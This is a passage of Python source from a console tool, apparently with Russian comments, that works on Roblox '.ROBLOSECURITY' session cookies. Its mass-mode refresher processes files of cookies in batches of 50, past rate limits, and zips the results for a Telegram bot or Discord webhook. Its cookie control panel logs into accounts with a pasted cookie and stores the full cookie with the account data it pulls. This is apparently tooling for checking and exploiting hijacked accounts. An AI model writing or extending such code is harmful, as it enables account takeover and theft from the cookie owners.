                                                        if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work']: await playOSSound()

                                                        if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] or config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook']:
                                                            await makeArchive(f'Roblox\\Cookie Refresher\\Mass Mode\\outputs\\{dateOfMassMode1Refreshing}')

                                                            messageText = f'*💜 {MT_Roblox} {MT_Cookie_Refresher.lower()}*'

                                                            if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot']:
                                                                await sendMessageTelegramBot(str(config['Roblox']['General']['Outputs']['Telegram_Bot_Token']), str(config['Roblox']['General']['Outputs']['Telegram_Bot_Chat_ID']), messageText, f'Roblox\\Cookie Refresher\\Mass Mode\\outputs\\{dateOfMassMode1Refreshing}.zip')

                                                            if config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook']:
                                                                await sendMessageDiscordWebhook(str(config['Roblox']['General']['Outputs']['Discord_Webhook_URL']), messageText.replace('*', '**'), 'Roblox\\Cookie Refresher\\Mass Mode\\outputs', f'{dateOfMassMode1Refreshing}.zip')
                                                            sys.stdout.write('\n')

                                                        await waitingInput()
                                                    await refresherMassModeOnly50Cookie()
                                                case '2':
                                                    async def refresherMassModeMore50Cookie():
                                                        if config['Roblox']['CookieRefresher']['MassMode']['Last_Refresh'] != '' and nextRefresh > datetime.now():
                                                            return await errorOrCorrectHandler(True, 12, f'{MT_Wait[0]} {abs(int((nextRefresh - datetime.now()).total_seconds()))} {MT_Seconds}.', f'{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Mass_Mode}')
                                                        if not os.path.exists('Roblox\\Cookie Refresher\\Mass Mode\\cookies.txt'):
                                                            return await errorOrCorrectHandler(True, 12, MT_No_Cookies_Found, f'{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Mass_Mode}')

                                                        correctedCookieList = []
                                                        for cookie in open(f'Roblox\\Cookie Refresher\\Mass Mode\\cookies.txt', 'r', encoding='UTF-8').readlines():
                                                            cookie = cookie.strip()
                                                            if search(COOKIE_PATTERN, cookie):
                                                                correctedCookieList.append(cookie)

                                                        if not correctedCookieList:
                                                            return await errorOrCorrectHandler(True, 12, MT_No_Cookies_Found, f'{MT_Roblox}\\{MT_Cookie_Refresher}\\{MT_Mass_Mode}')

                                                        dateOfMassMode2Refreshing = datetime.now().strftime('%d.%m.%Y - %H.%M.%S')

                                                        await removeLines(11)
                                                        sys.stdout.write(f'\n {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Start_Checking_File} \'{ANSI.DECOR.UNDERLINE1}cookies.txt{ANSI.CLEAR + ANSI.DECOR.BOLD}\':\n')

                                                        while True:
                                                            refreshTasks = []
                                                            while len(correctedCookieList) and len(refreshTasks) < 50:
                                                                refreshTask = asyncio.create_task(startMassModeRCR(correctedCookieList[0], dateOfMassMode2Refreshing))
                                                                refreshTasks.append(refreshTask)
                                                                correctedCookieList.remove(correctedCookieList[0])
                                                            await asyncio.gather(*refreshTasks)

                                                            config['Roblox']['CookieRefresher']['MassMode']['Last_Refresh'] = dateOfMassMode2Refreshing
                                                            await autoSaveConfig()

                                                            if not correctedCookieList:
                                                                break

                                                            sys.stdout.write(f'\r {ANSI.DECOR.BOLD}[{ANSI.FG.RED}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Rate_Limit_Has_Been_Reached}. {MT_Wait[1]} 60 {MT_Seconds}... :<{ANSI.CLEAR}\n')
                                                            await asyncio.sleep(60)
                                                            await removeLines(1)

                                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}~{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Checking_Complete}\n\n')
                                                        if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work']: await playOSSound()
                                                        
                                                        if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] or config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook']:
                                                            await makeArchive(f'Roblox\\Cookie Refresher\\Mass Mode\\outputs\\{dateOfMassMode2Refreshing}')

                                                            messageText = f'*💜 {MT_Roblox} {MT_Cookie_Refresher.lower()}*'

                                                            if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot']:
                                                                await sendMessageTelegramBot(str(config['Roblox']['General']['Outputs']['Telegram_Bot_Token']), str(config['Roblox']['General']['Outputs']['Telegram_Bot_Chat_ID']), messageText, f'Roblox\\Cookie Refresher\\Mass Mode\\outputs\\{dateOfMassMode2Refreshing}.zip')

                                                            if config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook']:
                                                                await sendMessageDiscordWebhook(str(config['Roblox']['General']['Outputs']['Discord_Webhook_URL']), messageText.replace('*', '**'), 'Roblox\\Cookie Refresher\\Mass Mode\\outputs', f'{dateOfMassMode2Refreshing}.zip')
                                                            sys.stdout.write('\n')

                                                        await waitingInput()
                                                    await refresherMassModeMore50Cookie()
                                                case 'P' | 'З':
                                                    config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work'] ^= True
                                                    if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work']: await playOSSound()
                                                case 'T' | 'Е':
                                                    config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] ^= True
                                                case 'D' | 'В':
                                                    config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook'] ^= True
                                                case '0':
                                                    whileTrueStage3 = False
                                                case 'F' | 'А':
                                                    await cls()
                                                    await lableASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    await removeLines(12)

                                            await autoSaveConfigAndRemoveLinesInSettings(robloxCookieRefresherMassModeTab.upper(), ('P', 'З', 'T', 'Е', 'D', 'В'), ('0', 'R', 'К'), 12)
                                    case '0':
                                        whileTrueStage2 = False
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                    case _:
                                        await removeLines(8)

                                await autoSaveConfigAndRemoveLinesInSettings(robloxCookieRefresherTab.upper(), ('P', 'З'), ('0', 'R', 'К'), 8)
                        # Анализ транзакций
                        case '4':
                            whileTrueStage2 = True
                            await removeLines(12)
                            while whileTrueStage2:
                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Transaction_Analysis}{ANSI.CLEAR}\n\n')
                                TAFiles = await printFiles('Transaction_Analysis', 'Roblox\\Transaction Analysis', True)
                                sys.stdout.write(f'{ANSI.DECOR.BOLD}{'  ┃\n' if TAFiles else ''} [{ANSI.FG.YELLOW}U{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Update_List}\n [{ANSI.FG.YELLOW}S{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Show_Amount_Of_Lines_In_Files'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Show_Amount_Of_Lines_In_Files}\n [{ANSI.FG.YELLOW}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Play_The_Sound_At_The_End_Of_The_Work}\n [{ANSI.FG.YELLOW}T{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Send[0]} {MT_Results_To_Telegram[0].lower() + MT_Results_To_Telegram[1:]}\n [{ANSI.FG.YELLOW}D{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {f'[{ANSI.FG.GREEN}+{ANSI.CLEAR + ANSI.DECOR.BOLD}]' if config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook'] else f'[{ANSI.FG.RED}-{ANSI.CLEAR + ANSI.DECOR.BOLD}]'} {MT_Send[0]} {MT_Results_To_Discord[0].lower() + MT_Results_To_Discord[1:]}\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                transactionAnalysisTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                if transactionAnalysisTab == '0': whileTrueStage2 = False
                                elif transactionAnalysisTab.isdigit() and int(transactionAnalysisTab) <= len(TAFiles):
                                    await robloxTransactionAnalysis(TAFiles[int(transactionAnalysisTab) - 1])
                                match transactionAnalysisTab.upper():
                                    case 'S' | 'Ы':
                                        config['Roblox']['General']['Show_Amount_Of_Lines_In_Files'] ^= True
                                    case 'P' | 'З':
                                        config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work'] ^= True
                                        if config['Roblox']['General']['Play_Sound_At_The_End_Of_The_Work']: await playOSSound()
                                    case 'T' | 'Е':
                                        config['Roblox']['General']['Outputs']['Send_Results_To_Telegram_Bot'] ^= True
                                    case 'D' | 'В':
                                        config['Roblox']['General']['Outputs']['Send_Results_To_Discord_Webhook'] ^= True
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])

                                await autoSaveConfigAndRemoveLinesInSettings(transactionAnalysisTab.upper(), ('S', 'Ы', 'P', 'З', 'T', 'Е', 'D', 'В'), (), 0)
                                await cls()
                                await lableASCII()
                        # Панель управлением куки
                        case '5':
                            whileTrueStage2 = True
                            await removeLines(12)
                            while whileTrueStage2:
                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Cookie_Control_Panel}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Enter_A_Cookie[1]}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_History_Manual}\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_History_Checker}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                cookieControlPanelCookieTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                match cookieControlPanelCookieTab.upper():
                                    case '1':
                                        await removeLines(9)
                                        sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Cookie_Control_Panel}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                        cookieControlPanelCookieEnter = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_A_Cookie[0]}:{ANSI.CLEAR} ')

                                        async def cookieControlPanelManualEnter():
                                            if cookieControlPanelCookieEnter == '0': return
                                            if not search(COOKIE_PATTERN, cookieControlPanelCookieEnter):
                                                await cls()
                                                await lableASCII()
                                                return await errorOrCorrectHandler(True, 0, MT_Incorrect_Cookie, f'{MT_Roblox}\\{MT_Cookie_Control_Panel}{ANSI.CLEAR + ANSI.DECOR.BOLD}')

                                            cookieRoblox  = {'.ROBLOSECURITY': cookieControlPanelCookieEnter}
                                            headersRoblox = None # {'User-Agent': ua.random}

                                            try:
                                                isAccountInformation = requests.get('https://www.roblox.com/my/settings/json', cookies=cookieRoblox).json()
                                            except requests.exceptions.JSONDecodeError:
                                                await cls()
                                                await lableASCII()
                                                return await errorOrCorrectHandler(True, 0, MT_Invalid_Cookie, f'{MT_Roblox}\\{MT_Cookie_Control_Panel}{ANSI.CLEAR + ANSI.DECOR.BOLD}')

                                            isID = isAccountInformation['UserId']

                                            getGlobalCheckListGamepasses()
                                            getGlobalCheckListBadges()
                                            getGlobalCheckListCustomGamepasses()
                                            getGlobalCheckListFavoritePlaces()
                                            getGlobalCheckListBundles()
                                            
                                            responseStatus, isID, resultsRCC = await isResponseDataFromCookie(cookieRoblox, headersRoblox, 'roblox', None, True)
                                            
                                            if f'{cookieControlPanelCookieEnter[115:130]}...{cookieControlPanelCookieEnter[-15:-1]}' not in config['Roblox']['CookieControlPanel']['CookieControlPanelHistory']:
                                                config['Roblox']['CookieControlPanel']['CookieControlPanelHistory'][f'{cookieControlPanelCookieEnter[115:130]}...{cookieControlPanelCookieEnter[-15:-1]}'] = [resultsRCC[1][2] if resultsRCC[1][2] else '?', isID if config['Roblox']['CookieChecker']['Main']['ID'] else '?', resultsRCC[2][2] if resultsRCC[2][2] else '?', resultsRCC[3][2] if resultsRCC[3][2] else '?', resultsRCC[4][2] if resultsRCC[4][2] else '?', resultsRCC[4][5] if resultsRCC[4][5] else '?', resultsRCC[5][2] if resultsRCC[5][2] else '?', resultsRCC[6][2] if resultsRCC[6][2] else '?', resultsRCC[7][2] if config['Roblox']['CookieChecker']['Main']['Pending'] else '?', resultsRCC[7][3] if config['Roblox']['CookieChecker']['Main']['Donate_1_Year'] else '?', resultsRCC[8][2] if resultsRCC[8][2] else '?', resultsRCC[8][5] if resultsRCC[8][5] else '?', resultsRCC[9][2] if resultsRCC[9][2] else '?', resultsRCC[10][2] if resultsRCC[10][2] else '?', resultsRCC[11][2] if resultsRCC[11][2] else '?', resultsRCC[12][2] if resultsRCC[12][2] else '?', resultsRCC[13][2] if resultsRCC[13][2] else '?', resultsRCC[14][2] if resultsRCC[14][2] else '?', resultsRCC[15][2] if resultsRCC[15][2] else '?', resultsRCC[16][2] if resultsRCC[16][2] else '?', resultsRCC[17][2] if resultsRCC[17][2] else '?', resultsRCC[18][2] if resultsRCC[18][2] else '?', resultsRCC[19][2] if resultsRCC[19][2] else '?', resultsRCC[20][2] if resultsRCC[20][2] else '?', resultsRCC[21][2] if resultsRCC[21][2] else '?', resultsRCC[22][2] if resultsRCC[22][2] else '?', resultsRCC[23][2] if resultsRCC[23][2] else '?', resultsRCC[24][2] if resultsRCC[24][2] else '?', resultsRCC[25][2] if resultsRCC[25][2] else '?', resultsRCC[26][2] if resultsRCC[26][2] else '?', resultsRCC[27][2] if resultsRCC[27][2] else '?', resultsRCC[28][2] if resultsRCC[28][2] else '?', resultsRCC[29][2] if resultsRCC[29][2] else '?', resultsRCC[30][2] if resultsRCC[30][2] else '?', resultsRCC[31][2] if resultsRCC[31][2] else '?', cookieControlPanelCookieEnter]
                                                if config['Roblox']['CookieControlPanel']['Save_Cookies_Added_Manually']:
                                                    await autoSaveConfig()

                                            await cookieControlPanel('CookieControlPanelHistory', f'{cookieControlPanelCookieEnter[115:130]}...{cookieControlPanelCookieEnter[-15:-1]}', f'{MT_Cookie_Control_Panel}')

                                        await cookieControlPanelManualEnter()
                                        await cls()
                                        await lableASCII()
                                    case '2':
                                        await removeLines(9)
                                        whileTrueStage3 = True
                                        while whileTrueStage3:
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Cookie_Control_Panel}\\{MT_History_Manual}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n\n')
                                            await printCCPCookiesInHistory('CookieControlPanelHistory')
                                            cookieControlPanelCookieManualHistoryFinderTab = input(f'{'  ┃\n' if config['Roblox']['CookieControlPanel']['CookieControlPanelHistory'] else ''} [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                            if cookieControlPanelCookieManualHistoryFinderTab == '0': whileTrueStage3 = False
                                            elif cookieControlPanelCookieManualHistoryFinderTab.isdigit() and int(cookieControlPanelCookieManualHistoryFinderTab) <= len(config['Roblox']['CookieControlPanel']['CookieControlPanelHistory']):
                                                await cookieControlPanel('CookieControlPanelHistory', list(config['Roblox']['CookieControlPanel']['CookieControlPanelHistory'])[int(cookieControlPanelCookieManualHistoryFinderTab) - 1], f'{MT_Cookie_Control_Panel}\\{MT_History_Manual}')
                                            elif cookieControlPanelCookieManualHistoryFinderTab.upper() in ('R', 'К'):
                                                loadConfig(configLoader['Loader']['Current_Config'])

                                            await cls()
                                            await lableASCII()
                                    case '3':
                                        await removeLines(9)
                                        whileTrueStage3 = True
                                        while whileTrueStage3:
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Cookie_Control_Panel}\\{MT_History_Checker}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n\n')
                                            await printCCPCookiesInHistory('RobloxCookieCheckerHistory')
                                            cookieControlPanelCookieCheckerHistoryFinderTab = input(f'{'  ┃\n' if config['Roblox']['CookieControlPanel']['RobloxCookieCheckerHistory'] else ''} [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                            if cookieControlPanelCookieCheckerHistoryFinderTab == '0': whileTrueStage3 = False
                                            elif cookieControlPanelCookieCheckerHistoryFinderTab.isdigit() and int(cookieControlPanelCookieCheckerHistoryFinderTab) <= len(config['Roblox']['CookieControlPanel']['RobloxCookieCheckerHistory']):
                                                await cookieControlPanel('RobloxCookieCheckerHistory', list(config['Roblox']['CookieControlPanel']['RobloxCookieCheckerHistory'])[int(cookieControlPanelCookieCheckerHistoryFinderTab) - 1], f'{MT_Cookie_Control_Panel}\\{MT_History_Checker}')
                                            elif cookieControlPanelCookieManualHistoryFinderTab.upper() in ('R', 'К'):
                                                loadConfig(configLoader['Loader']['Current_Config'])

                                            await cls()
                                            await lableASCII()
                                    case '0':
                                        whileTrueStage2 = False
                                        await removeLines(9)
                                    case 'F' | 'А':
                                        await cls()
                                        await lableASCII()
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                        await removeLines(9)
                                    case _:
                                        await removeLines(9)
                        # Разное
                        case '6':
                            whileTrueStage2 = True
                            columnarHeaders = [MT_Id, MT_Name, MT_Link]
                            await removeLines(12)
                            while whileTrueStage2:
                                sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Misc}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}1{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Gamepasses_Parser_From_The_Place}\n [{ANSI.FG.PINK}2{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Badges_Parser_From_The_Place}\n [{ANSI.FG.PINK}3{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Upload_All_Info_Gamepasses_And_Badges}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] ┃ {MT_Back}{ANSI.CLEAR}\n\n')
                                robloxMiscTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_Something}:{ANSI.CLEAR} ')
                                match robloxMiscTab.upper():
                                    # Парсер геймпассов
                                    case '1':
                                        await removeLines(9)
                                        miscRobloxParseGamepassesTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Misc}\\{MT_Gamepasses_Parser_From_The_Place}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Cancel}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_The_Place_ID}:{ANSI.CLEAR} ')

                                        async def parseRobloxGamepasses():
                                            if miscRobloxParseGamepassesTab == '0': return

                                            universeId = requests.get(f'https://apis.roblox.com/universes/v1/places/{miscRobloxParseGamepassesTab}/universe').json()['universeId']

                                            if universeId == None:
                                                return await errorOrCorrectHandler(True, 5, MT_Incorrent_Place_ID,          f'{MT_Roblox}\\{MT_Misc}\\{MT_Gamepasses_Parser_From_The_Place}')

                                            gamepassesInfo = requests.get(f'https://games.roblox.com/v1/games/{universeId}/game-passes?limit=100&sortOrder=Asc').json()

                                            if not gamepassesInfo['data']:
                                                return await errorOrCorrectHandler(True, 5, MT_The_Place_Has_No_Gamepasses, f'{MT_Roblox}\\{MT_Misc}\\{MT_Gamepasses_Parser_From_The_Place}')

                                            gameInfo = requests.get(f'https://games.roblox.com/v1/games?universeIds={universeId}').json()
                                            placeNameWithoutSpecial = await removeTwoSpaces(sub(r'[\\/:*?"<>|]', '', await removeBracketsAndIn(replace_emoji(gameInfo['data'][0]['name'], replace=''), True, True))).strip()
                                            await removeLines(3)
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Found_Data_On} {miscRobloxParseGamepassesTab} ({placeNameWithoutSpecial}):\n\n')

                                            parsedGamepasses = []
                                            for gamepass in gamepassesInfo['data']:
                                                gamepassName = str(gamepass['name']).replace('\r', '').replace('\n', '')
                                                if config['Roblox']['Misc']['GamepassesParser']['Remove_Emojies_From_Name']:                gamepassName = replace_emoji(gamepassName, replace='')
                                                if config['Roblox']['Misc']['GamepassesParser']['Remove_Round_Brackets_And_In_From_Name']:  gamepassName = await removeBracketsAndIn(gamepassName, True, False)
                                                if config['Roblox']['Misc']['GamepassesParser']['Remove_Square_Brackets_And_In_From_Name']: gamepassName = await removeBracketsAndIn(gamepassName, False, True)
                                                parsedGamepasses.append([gamepass['id'], gamepassName, f'https://www.roblox.com/game-pass/{gamepass['id']}'])

                                            os.makedirs('Roblox\\Misc\\Gamepasses parser', exist_ok=True)
                                            open(f'Roblox\\Misc\\Gamepasses parser\\{miscRobloxParseGamepassesTab} ({placeNameWithoutSpecial}).txt', 'w', encoding='UTF-8').write(f'\n  Meow :3\n\n  {MT_Place_ID}: {miscRobloxParseGamepassesTab}\n  {MT_Place_Name}: {gameInfo['data'][0]['name']}\n  {MT_Place_Link}: https://www.roblox.com/games/{miscRobloxParseGamepassesTab}\n\n  [*] {MT_Gamepasses}\n{columnar(parsedGamepasses, columnarHeaders, no_borders=True)}')
                                            sys.stdout.write(f'  {MT_Place_ID}: {miscRobloxParseGamepassesTab}\n  {MT_Place_Name}: {gameInfo['data'][0]['name']}\n  {MT_Place_Link}: https://www.roblox.com/games/{miscRobloxParseGamepassesTab}\n\n  [{ANSI.FG.GREEN}*{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.DECOR.UNDERLINE1}{MT_Gamepasses}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n{columnar(parsedGamepasses, columnarHeaders, no_borders=True)}\n {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_The_Data_Is_Saved_In}: Roblox\\Misc\\Gamepasses parser\\{miscRobloxParseGamepassesTab} ({placeNameWithoutSpecial}).txt\n\n')
                                            await waitingInput()

                                        await parseRobloxGamepasses()
                                        await cls()
                                        await lableASCII()
                                    # Парсер бейджей
                                    case '2':
                                        await removeLines(9)
                                        miscRobloxParseBadgesTab = input(f' {ANSI.DECOR.BOLD}[{ANSI.FG.CYAN}P{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.FG.CYAN}M:\\{MT_Roblox}\\{MT_Misc}\\{MT_Badges_Parser_From_The_Place}{ANSI.CLEAR}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.YELLOW}0{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Cancel}\n\n {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}<{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Enter_The_Place_ID}:{ANSI.CLEAR} ')
                                        
                                        async def parseRobloxBadges():
                                            if miscRobloxParseBadgesTab == '0': return

                                            requestUniverseId = requests.get(f'https://apis.roblox.com/universes/v1/places/{miscRobloxParseBadgesTab}/universe').json()['universeId']

                                            if requestUniverseId == None:
                                                return await errorOrCorrectHandler(True, 5, MT_Incorrent_Place_ID,        f'{MT_Roblox}\\{MT_Misc}\\{MT_Badges_Parser_From_The_Place}')

                                            requestBadgesInfo = requests.get(f'https://badges.roblox.com/v1/universes/{requestUniverseId}/badges?limit=100&sortOrder=Asc').json()

                                            if not requestBadgesInfo['data']:
                                                return await errorOrCorrectHandler(True, 5, MT_The_Place_Has_No_Badges,   f'{MT_Roblox}\\{MT_Misc}\\{MT_Badges_Parser_From_The_Place}')

                                            requestGameInfo = requests.get(f'https://games.roblox.com/v1/games?universeIds={requestUniverseId}').json()
                                            placeNameWithoutSpecial = await removeTwoSpaces(sub(r'[\/:*?"<>|]', '', await removeBracketsAndIn(replace_emoji(requestGameInfo['data'][0]['name'], replace=''), True, True))).strip()

                                            await removeLines(3)
                                            sys.stdout.write(f' {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_Found_Data_On} {miscRobloxParseBadgesTab} ({placeNameWithoutSpecial}):\n\n')

                                            parsedBadges = []

                                            for badge in requestBadgesInfo['data']:
                                                badgeName = str(badge['name']).replace('\r', '').replace('\n', '')
                                                if config['Roblox']['Misc']['BadgesParser']['Remove_Emojies_From_Name']:                badgeName = replace_emoji(badgeName, replace='')
                                                if config['Roblox']['Misc']['BadgesParser']['Remove_Round_Brackets_And_In_From_Name']:  badgeName = await removeBracketsAndIn(badgeName, True, False)
                                                if config['Roblox']['Misc']['BadgesParser']['Remove_Square_Brackets_And_In_From_Name']: badgeName = await removeBracketsAndIn(badgeName, False, True)
                                                parsedBadges.append([badge['id'], badgeName, f'https://www.roblox.com/badges/{badge['id']}'])

                                            os.makedirs('Roblox\\Misc\\Badges parser', exist_ok=True)
                                            open(f'Roblox\\Misc\\Badges parser\\{miscRobloxParseBadgesTab} ({placeNameWithoutSpecial}).txt', 'w', encoding='UTF-8').write(f'\n  Meow :3\n\n  {MT_Place_ID}: {miscRobloxParseBadgesTab}\n  {MT_Place_Name}: {requestGameInfo['data'][0]['name']}\n  {MT_Place_Link}: https://www.roblox.com/games/{miscRobloxParseBadgesTab}\n\n  [*] {MT_Badges}\n{columnar(parsedBadges, columnarHeaders, no_borders=True)}')
                                            sys.stdout.write(f'  {MT_Place_ID}: {miscRobloxParseBadgesTab}\n  {MT_Place_Name}: {requestGameInfo['data'][0]['name']}\n  {MT_Place_Link}: https://www.roblox.com/games/{miscRobloxParseBadgesTab}\n\n  [{ANSI.FG.GREEN}*{ANSI.CLEAR + ANSI.DECOR.BOLD}] {ANSI.DECOR.UNDERLINE1}{MT_Badges}{ANSI.CLEAR + ANSI.DECOR.BOLD}\n{columnar(parsedBadges, columnarHeaders, no_borders=True)}\n {ANSI.DECOR.BOLD}[{ANSI.FG.GREEN}>{ANSI.CLEAR + ANSI.DECOR.BOLD}] {MT_The_Data_Is_Saved_In}: Roblox\\Misc\\Badges parser\\{miscRobloxParseBadgesTab} ({placeNameWithoutSpecial}).txt\n\n')
                                            await waitingInput()

                                        await parseRobloxBadges()
                                        await cls()
                                        await lableASCII()
                                    # Выгрузка геймпассов и бейджей используемые программой
                                    case '3':
                                        for place in listOfPlaces:
                                            uploadAllGamepassesAndBadges = []
                                            if getattr(place, 'Gamepasses', False):
                                                for gamepass in place.Gamepasses.listOfGamepasses:
                                                    uploadAllGamepassesAndBadges.append([gamepass[1], gamepass[0], f'https://www.roblox.com/game-pass/{gamepass[1]}'])
                                                os.makedirs('Roblox\\Misc\\All gamepasses and badges from program\\Gamepasses', exist_ok=True)
